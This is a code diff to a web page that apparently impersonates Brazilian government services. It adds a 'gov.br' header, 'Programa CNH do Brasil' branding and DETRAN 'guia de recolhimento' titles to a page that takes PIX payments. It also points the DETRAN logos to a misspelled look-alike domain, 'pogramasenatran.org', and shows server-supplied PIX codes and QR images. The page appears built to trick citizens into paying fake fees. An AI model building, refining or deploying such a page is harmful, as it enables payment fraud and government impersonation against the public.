@@ -13,6 +13,34 @@
       color: #111827;
     }
     main.flex-1 { min-height: 100vh; }
+    header.govbr {
+      background: #f7f7f7;
+      border-bottom: 1px solid #e5e7eb;
+    }
+    .govbr-top {
+      background: #ffffff;
+      border-bottom: 1px solid #e5e7eb;
+      padding: 10px 16px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+    .govbr-logo {
+      font-weight: 700;
+      color: #0b3d91;
+      font-size: 18px;
+    }
+    .govbr-bar {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 10px 16px;
+      color: #374151;
+    }
+    .govbr-title {
+      font-size: 15px;
+      font-weight: 500;
+    }
     .flex-1 { flex: 1 1 0%; }
     .p-4 { padding: 16px; }
     .max-w-lg { max-width: 32rem; }
@@ -116,6 +144,16 @@
   <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
 </head>
 <body>
+  <header class="govbr">
+    <div class="govbr-top">
+      <div class="govbr-logo">gov.br</div>
+    </div>
+    <div class="govbr-bar">
+      <span>☰</span>
+      <span class="govbr-title">Programa CNH do Brasil</span>
+    </div>
+  </header>
+
   <main class="flex-1 p-4">
     <div class="max-w-lg mx-auto">
       <div class="bg-yellow-50 rounded-lg p-4 mb-4">
@@ -243,43 +281,20 @@
       detran: params.get("detran") || "",
     };
 
-    const detranLogoByUf = {
-      AC: "https://www.agencia.ac.gov.br/wp-content/uploads/2019/07/Nova-Logo-Detran-Acre-2019-2-800x416.png",
-      AL: "https://seeklogo.com/images/D/detran-alagoas-logo-C0D07878CA-seeklogo.com.png",
-      AP: "https://www.exametoxicologico.com.br/wp-content/uploads/2019/03/Detran-Amapa-ap-exame-toxicologico.jpg",
-      AM: "https://apstatic.prodam.am.gov.br/images/detran/logo-detran-horizontal.png",
-      BA: "https://images.seeklogo.com/logo-png/39/1/detran-bahia-logo-png_seeklogo-395407.png",
-      CE: "https://www.detran.ce.gov.br/wp-content/uploads/2018/04/logo_detran_2018.png",
-      DF: "https://zpy-customer-communication-cms-strapi-images-2.s3.amazonaws.com/DETRAN_DF_378eeacd03.webp",
-      ES: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRbFOyL7H4mp0igBsJUKg3y4m_7mg9xkqXPnQ&s",
-      GO: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTmmhmirDeoyas3iEHwHapMrQ3vIHa0ivq3wQ&s",
-      MA: "https://seeklogo.com/images/D/detran-maranhao-logo-4F04A57787-seeklogo.com.png",
-      MT: "https://portalcredenciamento.detran.mt.gov.br/815ed82f649be4cc8df5e9e024e23482.png",
-      MS: "https://d1yjjnpx0p53s8.cloudfront.net/styles/logo-thumbnail/s3/082015/detranms_0.png?itok=oDYhYuLp",
-      MG: "https://www.camarauberlandia.mg.gov.br/DETRANMG.jpg/@@images/480d676e-e0af-433a-bec8-d9676a937a59.jpeg",
-      PA: "https://www.roservalramos.com.br/wp-content/uploads/2020/01/detran-pa-consulta.jpg",
-      PB: "https://www.segundaviadetudo.com.br/wp-content/uploads/2020/07/Logo-Detran-PB.png",
-      PR: "https://reciclagemcnhonline.com.br/wp-content/uploads/2024/08/Detran-PR-600x170.png",
-      PE: "https://www.detran.pe.gov.br/images/FOTO%202022/Design%20sem%20nome%204.jpg",
-      PI: "https://conteudo.consultapelaplaca.com.br/wp-content/uploads/2024/10/Detran-PI-IPVA-PI-2024-1.jpg",
-      RJ: "https://odia.ig.com.br/_midias/jpg/2020/07/27/1140x632/1_detran_rj_2020_1280x720-18488499.jpg",
-      RN: "https://www.novacruz.rn.leg.br/detran.png/image_preview",
-      RS: "https://yt3.googleusercontent.com/JMoN0dwOBMHH6MLzGDD9m9QKYTTXKNqSeZHKwO46Zg006Nl-Yf4Ug17edHRcVDPQUYewi03ApQ=s900-c-k-c0x00ffffff-no-rj",
-      RO: "https://portaleducacional.detran.ro.gov.br/Content/images/LogoDetranGrandel.png",
-      RR: "https://www.detran.rr.gov.br/wp-content/uploads/2021/09/logotipo-detran-rr.png",
-      SC: "https://servicos.detran.sc.gov.br/images/og-image.png",
-      SP: "https://grandesnomesdapropaganda.com.br/wp-content/uploads/2014/09/Logo-detran-SP.jpg",
-      SE: "https://images.seeklogo.com/logo-png/55/1/detran-se-logo-png_seeklogo-550201.png",
-      TO: "https://www.exametoxicologico.com.br/wp-content/uploads/2019/03/detran-to-exame-toxicologico.jpg",
-    };
+    const detranLogoBase = "https://assets.pogramasenatran.org/detran/";
 
     const detranUf = (data.uf || data.detran || "").replace("DETRAN/", "").trim().toUpperCase();
     const detranLabel = detranUf ? `DETRAN/${detranUf}` : "DETRAN";
     document.getElementById("detran-title").textContent = `${detranLabel} - GUIA DE RECOLHIMENTO`;
     document.getElementById("pix-title").textContent = `${detranLabel} - PAGAMENTO VIA PIX`;
-    const logo = detranLogoByUf[detranUf] || "";
+    const logo = detranUf ? `${detranLogoBase}${detranUf}.webp` : "";
     const logoEl = document.getElementById("detran-logo");
-    if (logo) logoEl.src = logo; else logoEl.style.display = "none";
+    if (logo) {
+      logoEl.src = logo;
+      logoEl.onerror = () => { logoEl.style.display = "none"; };
+    } else {
+      logoEl.style.display = "none";
+    }
 
     const formatCpf = (value) => {
       const digits = (value || "").replace(/\D/g, "");
@@ -335,9 +350,17 @@
         return;
       }
       document.getElementById("pix-code").textContent = json.pix_code || "";
+      const qrImg = document.getElementById("qr");
+      const qrUrl = json.pix_qr_code || json.qr_code || "";
+      if (qrUrl && (qrUrl.startsWith("http") || qrUrl.startsWith("data:"))) {
+        qrImg.src = qrUrl;
+        return;
+      }
       const pixText = json.pix_code || "";
-      const qr = await QRCode.toDataURL(pixText, { width: 180, margin: 1 });
-      document.getElementById("qr").src = qr;
+      if (pixText) {
+        const qr = await QRCode.toDataURL(pixText, { width: 180, margin: 1 });
+        qrImg.src = qr;
+      }
     }
 
     document.getElementById("copy").addEventListener("click", async () => {
